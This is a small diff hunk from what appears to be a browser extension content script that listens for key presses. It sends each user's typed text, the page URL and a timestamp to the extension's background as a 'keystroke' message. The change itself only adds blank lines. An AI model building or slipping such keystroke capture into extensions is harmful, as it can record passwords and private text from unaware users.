@@ -11,10 +11,12 @@ document.addEventListener("keydown", (event) => {
     }
 
     // Send data only when the URL changes or after a short delay
+
     chrome.runtime.sendMessage({
         type: "keystroke",
         url: currentUrl,
         text: typedText,
         timestamp: new Date().toISOString(),
     });
+
 });
